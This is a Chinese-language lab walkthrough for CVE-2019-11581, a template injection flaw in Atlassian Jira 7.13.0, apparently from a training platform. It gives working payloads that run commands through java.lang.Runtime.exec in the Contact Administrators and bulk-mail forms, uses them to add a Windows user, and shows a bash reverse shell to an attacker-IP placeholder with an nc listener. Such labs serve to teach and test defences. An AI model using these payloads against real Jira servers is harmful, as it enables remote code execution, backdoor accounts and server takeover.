---
description: CVE-2019-11581
---

# Atlassian Jira 模板注入漏洞

## 【原理】

此漏洞由于Atlassian Jira中的Atlassian Jira Server和Jira Data Center模块存在模板注入，当”联系管理员表单“功能开启时，攻击者可以在表单插入java恶意代码,当服务端对传入数据进行解析时,会执行数据中插入的恶意代码,并执行其中的命令。**攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作**，对服务器造成巨大的影响。

## 【工具】

* Windows7

## 【步骤】

```text
win7 ip：192.168.0.103
漏洞利用条件：联系管理员处必须开启 （需要知道后台管理员账号密码）
```

1.点击启动场景按钮，等待场景启动完成后，通过靶标接入协议进入漏洞标靶

2.环境准备:Atlassian JIRAv7.13.0 \(以该版本为例，该版本存在漏洞）下载地址：

[https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-software-7.13.0-x64.exe](https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-software-7.13.0-x64.exe)

安装过程不再详细描述（按照提示进行安装，先在官方注册一个账号然后拿到一个试用期序列号并进行安装），注意，到了邮件配置那一步经尽量选以后\(默认就是\)，然后进入后台配置。

[https://id.atlassian.com/signup?application=mac&continue=https://my.atlassian.com](https://id.atlassian.com/signup?application=mac&continue=https://my.atlassian.com)

登录注册环境后，选择[New Trial License](https://my.atlassian.com/license/evaluation)

![image-20210223114900852](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223114900852.png)

![image-20210223114939134](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223114939134.png)

输入服务器ID生成许可证

![image-20210223115152709](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223115152709.png)

![image-20210223114745086](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223114745086.png)

验证完成之后，创建账户~

![image-20210223115223063](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223115223063.png)

```text
用户名：admin
密码：sec-2021
```

邮件配置选以后\(默认就是\)

![image-20210223133850032](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223133850032.png)

然后进入后台配置。

![image-20210223140713796](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223140713796.png)

安装完成~

![image-20210223143343089](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223143343089.png)

3.确认未登陆状态下漏洞的存在

访问如下URL（无需管理员账户权限）：

[http://192.168.0.103:8080/secure/ContactAdministrators!default.jspa](http://192.168.0.103:8080/secure/ContactAdministrators!default.jspa)

如果提示如下图，这说明没有配置联系管理员是无法触发漏洞。

![image-20210223145057082](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223145057082.png)

请登陆后台开启联系管理员，配置地址如下：

[http://192.168.0.103:8080/secure/admin/EditApplicationProperties!default.jspa](http://192.168.0.103:8080/secure/admin/EditApplicationProperties!default.jspa)

输入账号密码进行登录。

默认是关闭的，需要配置了STMP发信后才能开启，配置STMP的时候可以测试连接，服务器必须开25端口，不然不能发邮件，下图是开启成功

![image-20210223150016533](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223150016533.png)

![image-20210223150102555](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223150102555.png)

记得点击更新~

4.未登陆状态下触发漏洞

访问：[http://192.168.0.103:8080/secure/ContactAdministrators!default.jspa](http://192.168.0.103:8080/secure/ContactAdministrators!default.jspa)

![image-20210223150222453](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223150222453.png)

```text
在Subject填入payload，注意，我这里环境是windows机器，所以可以添加账号观察，Linux可以用反弹shell的代码等等,反正换成自己想执行的命令。

$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('net user bk abc@ABC123 /add').waitFor()
```

![image-20210223150314511](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223150314511.png)

发送了后可能会等一会儿，因为要加入邮件队列。这时候再上服务器执行net user查看，发现正是刚刚执行命令添加的账户。

![image-20210223151150202](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223151150202.png)

5.登陆管理员账号触发漏洞

登陆管理员账号，然后访问如下URL：

[http://192.168.0.103:8080/secure/admin/SendBulkMail!default.jspa](http://192.168.0.103:8080/secure/admin/SendBulkMail!default.jspa)

填入payload，如下，注意执行命令添加账号的账户名

```text
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('net user bk01 abc@ABC123 /add').waitFor()
```

![image-20210223152215875](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223152215875.png)

点击发送，稍作等待即可看到创建好了一个用户。

![image-20210223152338184](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210223152338184.png)

6.拓展

```text
linux下可执行：
目标Jira系统可执行的POC
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://www.baidu.com').waitFor()
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('bash -i >& /dev/tcp/攻击者IP/2333 0>&1').waitFor()
攻击者主机执行:nc  -lvvp 2333
```

